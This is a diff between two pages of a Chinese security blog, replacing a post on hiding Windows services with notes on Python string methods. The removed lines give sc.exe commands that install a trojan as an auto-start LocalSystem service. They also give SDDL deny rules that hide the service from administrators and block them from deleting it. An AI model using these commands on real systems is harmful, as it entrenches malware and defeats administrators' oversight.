@@ -15,25 +15,29 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta name="description" content="简介sc.exe是Windows系统文件中自带的服务管理程序，可远程对服务进行操作；这里讲述了利用SC和Powershell程序来隐藏服务，搭到长期维持权限的效果。">
+<meta name="description" content="简介本来想一步步都记上的，小图杂图太多了上传太麻烦，挑Python比较重要这一块记录一下方便用的时候查找。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SC实现隐藏Windows服务维持权限">
-<meta property="og:url" content="https://www.tu3k.cn/2021/01/10/sc-powershell-serivces-yincang/index.html">
+<meta property="og:title" content="Python字符串内建函数">
+<meta property="og:url" content="https://www.tu3k.cn/2021/01/17/Python-def/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="简介sc.exe是Windows系统文件中自带的服务管理程序，可远程对服务进行操作；这里讲述了利用SC和Powershell程序来隐藏服务，搭到长期维持权限的效果。">
+<meta property="og:description" content="简介本来想一步步都记上的，小图杂图太多了上传太麻烦，挑Python比较重要这一块记录一下方便用的时候查找。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/1.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/2.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/3.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/4.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/5.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/6.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/sc_powershell/7.png">
-<meta property="article:published_time" content="2021-01-10T05:51:26.000Z">
-<meta property="article:modified_time" content="2021-01-10T15:25:48.981Z">
-<meta property="article:tag" content="维持权限">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/1.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/2.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/3.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/4.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/5.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/6.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/7.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/8.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/9.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/10.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/11.png">
+<meta property="article:published_time" content="2021-01-17T08:30:17.000Z">
+<meta property="article:modified_time" content="2021-01-17T08:43:36.054Z">
+<meta property="article:tag" content="Python函数">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.tu3k.cn/images/sc_powershell/1.png">
+<meta name="twitter:image" content="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/1.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -67,7 +71,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>SC实现隐藏Windows服务维持权限 | Tu3k's Blog</title>
+<title>Python字符串内建函数 | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -276,11 +280,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-sc-powershell-serivces-yincang" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Python-def" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/01/10/sc-powershell-serivces-yincang/" class="article-date">
-      <time datetime="2021-01-10T05:51:26.000Z" itemprop="datePublished">2021-01-10</time>
+      <a href="/2021/01/17/Python-def/" class="article-date">
+      <time datetime="2021-01-17T08:30:17.000Z" itemprop="datePublished">2021-01-17</time>
 </a>
 
 
@@ -295,7 +299,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      SC实现隐藏Windows服务维持权限
+      Python字符串内建函数
     </h1>
   
 
@@ -306,7 +310,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90/" rel="tag">维持权限</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python%E5%87%BD%E6%95%B0/" rel="tag">Python函数</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -316,14 +320,34 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sc.exe是Windows系统文件中自带的服务管理程序，可远程对服务进行操作；这里讲述了利用SC和Powershell程序来隐藏服务，搭到长期维持权限的效果。</p>
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本来想一步步都记上的，小图杂图太多了上传太麻烦，挑Python比较重要这一块记录一下方便用的时候查找。</p>
 <a id="more"></a>
-<h3 id="SC实现"><a href="#SC实现" class="headerlink" title="SC实现"></a>SC实现</h3><h4 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h4><p>创建一个服务名为demo的自启动服务，服务运行地址指向木马路径，以tcpip协议传输并以本地系统权限运行<br><code>sc create demo start= auto binPath= &quot;cmd.exe /k C:\tu.exe&quot; depend= Tcpip obj= Localsystem</code><br>添加个描述<br><code>sc description demo &quot;tu3k.cn&quot;</code><br><img src="https://www.tu3k.cn/images/sc_powershell/1.png" alt="sc_powershell" title="sc_powershell"><br>这时服务器重启会自启动上线，手动启动也可以上线，不过有时候手动可能会出错，但是不影响上线。<br><img src="https://www.tu3k.cn/images/sc_powershell/2.png" alt="sc_powershell" title="sc_powershell"><br>成功上线<br><img src="https://www.tu3k.cn/images/sc_powershell/3.png" alt="cs" title="cs"><br>删除进程命令<code>sc delete demo</code><br>但是管理员在进行维护的时候，发现这个进程可疑，就会查看这个进程的详细信息<br><img src="https://www.tu3k.cn/images/sc_powershell/4.png" alt="cs" title="cs"><br>我们的木马路径藏的再隐蔽也一览无余了，接着管理员就会执行命令删掉服务，权限也就掉了，如何藏得更深或者管理员没有这个权限去删呢再或者管理员根本发现不了我们的隐藏木马进程</p>
-<p>下面是正文：</p>
-<h4 id="隐藏服务"><a href="#隐藏服务" class="headerlink" title="隐藏服务"></a>隐藏服务</h4><p>为了不让管理员发现用于权限维持的服务，通过SDDL修改服务的安全描述符，安全描述符是用来配置该服务允许哪些用户权限访问<br>使用sc程序的sdset模块修改安全描述符<br><code>sc.exe sdset test &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code><br><img src="https://www.tu3k.cn/images/sc_powershell/5.png" alt="cs" title="cs"><br>现在用<code>sc query demo</code>和powershell的<code>get-serivce</code>查询都已经查不到了<br>不过<code>sc qc demo</code> 还是可以查到，问题已经不大了<br><img src="https://www.tu3k.cn/images/sc_powershell/6.png" alt="cs" title="cs"></p>
-<h4 id="SDDL原理"><a href="#SDDL原理" class="headerlink" title="SDDL原理"></a>SDDL原理</h4><p>通过修改安全描述符来控制那些用户具有访问和读取此服务相关信息的权限<br>sc sdset 有几个参数，D是Access Denied 也就是权限拒绝，刚才执行的语句内就有这个参数<br>如果要启用的话就把D改成A，A代表Access Alower 允许权限</p>
-<h3 id="增强SC的隐藏"><a href="#增强SC的隐藏" class="headerlink" title="增强SC的隐藏"></a>增强SC的隐藏</h3><p>在上面的SC中隐藏过后还可以使用<code>sc qc demo</code>查看服务信息，这里增强一下，拒绝所有用户权限查询服务配置信息项<br><code>sc.exe sdset test &quot;D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code><br><img src="https://www.tu3k.cn/images/sc_powershell/7.png" alt="powershell" title="powershell"></p>
-<h3 id="使用Powershell还原权限"><a href="#使用Powershell还原权限" class="headerlink" title="使用Powershell还原权限"></a>使用Powershell还原权限</h3><p><code>powershell.exe &amp; $env:SystemRoot\System32\sc.exe sdset auto_calc &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code></p>
+<h2 id="字符串的内建函数"><a href="#字符串的内建函数" class="headerlink" title="字符串的内建函数"></a>字符串的内建函数</h2><p><strong>在Python里，要处理字符串达到我们想要的效果就要了解透彻他的字符串处理函数，也是字符串的内建函数。</strong><br>所有函数语法都要在函数前加上字符串变量 例如   str.capitalize()</p>
+<h3 id="capitalize"><a href="#capitalize" class="headerlink" title="capitalize()"></a>capitalize()</h3><p>将字符串的第一个字符转换为大写，语句 str1.capitalize()</p>
+<h3 id="center-width-str"><a href="#center-width-str" class="headerlink" title="center(width,str)"></a>center(width,str)</h3><p>填充指定字符str到原字符串两边，width总长度，语句 str1.center(20,’*’)，最后计算长度包括str1原本的长度</p>
+<h3 id="count-str"><a href="#count-str" class="headerlink" title="count(str)"></a>count(str)</h3><p>返回str在字符串中出现的次数，语句：str1.count(str)</p>
+<h3 id="encode-‘字符格式’"><a href="#encode-‘字符格式’" class="headerlink" title="encode(‘字符格式’)"></a>encode(‘字符格式’)</h3><p>将一个字符串进行unicode编码 语句  str2_encode = str2.encode(‘UTF-8’)</p>
+<h3 id="decode-‘字符格式’"><a href="#decode-‘字符格式’" class="headerlink" title="decode(‘字符格式’)"></a>decode(‘字符格式’)</h3><p>将一个字符串进行unicode解码 语句  print(str2_encode.decode(‘UTF-8’))<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/1.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="endwith-patt"><a href="#endwith-patt" class="headerlink" title="endwith(patt)"></a>endwith(patt)</h3><p>判断在字符串中是否以patt结尾，是返回True，否则False</p>
+<h3 id="startswith-patt"><a href="#startswith-patt" class="headerlink" title="startswith(patt)"></a>startswith(patt)</h3><p>判断字符串是否以patt开头，第二个参数是从起始位置5开始<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/2.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="find-str"><a href="#find-str" class="headerlink" title="find(str)"></a>find(str)</h3><p>检测字符串中是否含有str，有的话返回第一次出现的索引位置，没有返回-1<br>相关函数：str.rfine(str1)——和find方法一样，不过是从右边开始查找</p>
+<h3 id="index-str"><a href="#index-str" class="headerlink" title="index(str)"></a>index(str)</h3><p>和find用法一样，不过这个函数找不到字符串会报错<br>相关函数：str.rindex(str1)——和index方法一样，不过是从右边开始查找<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/3.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="islower"><a href="#islower" class="headerlink" title="islower()"></a>islower()</h3><p>判断字符串内字符是否全为小写，正确则True，否则False，语句 str.islower()</p>
+<h3 id="isupper"><a href="#isupper" class="headerlink" title="isupper()"></a>isupper()</h3><p>判断字符串内是否全部为大写，返回布尔值</p>
+<h3 id="isdigit"><a href="#isdigit" class="headerlink" title="isdigit()"></a>isdigit()</h3><p>判断字符串内字符是否只包含了数字，正确True，反则False，语句  str.isdigit()，包含unicode编码的数字也会被视为false<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/4.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="isnumberic"><a href="#isnumberic" class="headerlink" title="isnumberic()"></a>isnumberic()</h3><p>判断字符串内字符是否只由数字组成，包括unicode编码等等编码格式的存在。<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/5.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="isspace"><a href="#isspace" class="headerlink" title="isspace()"></a>isspace()</h3><p>判断字符串是否只包含空白<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/6.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="len"><a href="#len" class="headerlink" title="len()"></a>len()</h3><p>返回一个字符串的长度</p>
+<h3 id="lower"><a href="#lower" class="headerlink" title="lower()"></a>lower()</h3><p>转换所有字符大写为小写</p>
+<h3 id="upper"><a href="#upper" class="headerlink" title="upper()"></a>upper()</h3><p>转换所有字符小写为大写<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/7.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="max-、min"><a href="#max-、min" class="headerlink" title="max()、min()"></a>max()、min()</h3><p>返回字符串中最大和最小的字符</p>
+<h3 id="lstrip"><a href="#lstrip" class="headerlink" title="lstrip()"></a>lstrip()</h3><p>截掉字符串左边的空格</p>
+<h3 id="rstrip"><a href="#rstrip" class="headerlink" title="rstrip()"></a>rstrip()</h3><p>截掉字符串右边的空格<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/8.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="replace-str1-str2"><a href="#replace-str1-str2" class="headerlink" title="replace(str1,str2)"></a>replace(str1,str2)</h3><p>将字符串中的str1替换为str2<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/9.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="split-str"><a href="#split-str" class="headerlink" title="split(str)"></a>split(str)</h3><p>以str的条件分割字符串，返回一个列表<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/10.png" alt="Python" title="字符串内建函数"></p>
+<h3 id="swapcase"><a href="#swapcase" class="headerlink" title="swapcase()"></a>swapcase()</h3><p>将字符串中的字符大写转小写 小写转大写</p>
+<h3 id="title"><a href="#title" class="headerlink" title="title()"></a>title()</h3><p>转换为标题化格式，将字符串中每个字符串的首位大写，注意：非字母后的第一位字母转换为大写</p>
+<h3 id="zfill-length"><a href="#zfill-length" class="headerlink" title="zfill(length)"></a>zfill(length)</h3><p>返回指定长度字符串的值，右对齐，多出来的在左对齐加0补充<br><img src="https://www.tu3k.cn/images/Python%E7%AC%94%E8%AE%B0/%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/11.png" alt="Python" title="字符串内建函数"></p>
 
     
 </div>
@@ -332,13 +356,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2021/01/10/sc-powershell-serivces-yincang/">SC实现隐藏Windows服务维持权限</a></p>
+        <p><span>Title:</span><a href="/2021/01/17/Python-def/">Python字符串内建函数</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2021-01-10, 13:51:26</p>
-        <p><span>Updated:</span>2021-01-10, 23:25:48</p>
+        <p><span>Created:</span>2021-01-17, 16:30:17</p>
+        <p><span>Updated:</span>2021-01-17, 16:43:36</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2021/01/10/sc-powershell-serivces-yincang/" title="SC实现隐藏Windows服务维持权限">https://www.tu3k.cn/2021/01/10/sc-powershell-serivces-yincang/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/10/sc-powershell-serivces-yincang/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/01/17/Python-def/" title="Python字符串内建函数">https://www.tu3k.cn/2021/01/17/Python-def/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/17/Python-def/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -350,16 +374,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/01/11/chubanshe-bugs/">
-                    某出版社漏洞大礼包
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/01/09/74cms-tempelate-log-include-shell/">
-                    骑士CMS 模板文件日志包含Getshell
+                <a href="/2021/01/14/Python-one/">
+                    Python笔记1——基本语法
                 </a>
             </div>
         
@@ -371,7 +389,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SC%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">SC实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text">创建服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.2.</span> <span class="toc-text">隐藏服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SDDL%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">SDDL原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%9E%E5%BC%BASC%E7%9A%84%E9%9A%90%E8%97%8F"><span class="toc-number">1.2.</span> <span class="toc-text">增强SC的隐藏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Powershell%E8%BF%98%E5%8E%9F%E6%9D%83%E9%99%90"><span class="toc-number">1.3.</span> <span class="toc-text">使用Powershell还原权限</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">字符串的内建函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#capitalize"><span class="toc-number">2.1.</span> <span class="toc-text">capitalize()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#center-width-str"><span class="toc-number">2.2.</span> <span class="toc-text">center(width,str)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#count-str"><span class="toc-number">2.3.</span> <span class="toc-text">count(str)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encode-%E2%80%98%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E2%80%99"><span class="toc-number">2.4.</span> <span class="toc-text">encode(‘字符格式’)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decode-%E2%80%98%E5%AD%97%E7%AC%A6%E6%A0%BC%E5%BC%8F%E2%80%99"><span class="toc-number">2.5.</span> <span class="toc-text">decode(‘字符格式’)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#endwith-patt"><span class="toc-number">2.6.</span> <span class="toc-text">endwith(patt)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#startswith-patt"><span class="toc-number">2.7.</span> <span class="toc-text">startswith(patt)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-str"><span class="toc-number">2.8.</span> <span class="toc-text">find(str)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#index-str"><span class="toc-number">2.9.</span> <span class="toc-text">index(str)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#islower"><span class="toc-number">2.10.</span> <span class="toc-text">islower()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isupper"><span class="toc-number">2.11.</span> <span class="toc-text">isupper()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isdigit"><span class="toc-number">2.12.</span> <span class="toc-text">isdigit()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isnumberic"><span class="toc-number">2.13.</span> <span class="toc-text">isnumberic()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isspace"><span class="toc-number">2.14.</span> <span class="toc-text">isspace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#len"><span class="toc-number">2.15.</span> <span class="toc-text">len()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lower"><span class="toc-number">2.16.</span> <span class="toc-text">lower()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upper"><span class="toc-number">2.17.</span> <span class="toc-text">upper()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#max-%E3%80%81min"><span class="toc-number">2.18.</span> <span class="toc-text">max()、min()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lstrip"><span class="toc-number">2.19.</span> <span class="toc-text">lstrip()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rstrip"><span class="toc-number">2.20.</span> <span class="toc-text">rstrip()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#replace-str1-str2"><span class="toc-number">2.21.</span> <span class="toc-text">replace(str1,str2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#split-str"><span class="toc-number">2.22.</span> <span class="toc-text">split(str)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swapcase"><span class="toc-number">2.23.</span> <span class="toc-text">swapcase()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#title"><span class="toc-number">2.24.</span> <span class="toc-text">title()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zfill-length"><span class="toc-number">2.25.</span> <span class="toc-text">zfill(length)</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -407,7 +425,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"SC实现隐藏Windows服务维持权限　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Python字符串内建函数　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -427,15 +445,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/01/11/chubanshe-bugs/" title="Pre: 某出版社漏洞大礼包">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/01/09/74cms-tempelate-log-include-shell/" title="Next: 骑士CMS 模板文件日志包含Getshell">
+            <a href="/2021/01/14/Python-one/" title="Next: Python笔记1——基本语法">
                 <i class="fa fa-angle-right"></i>
             </a>
         
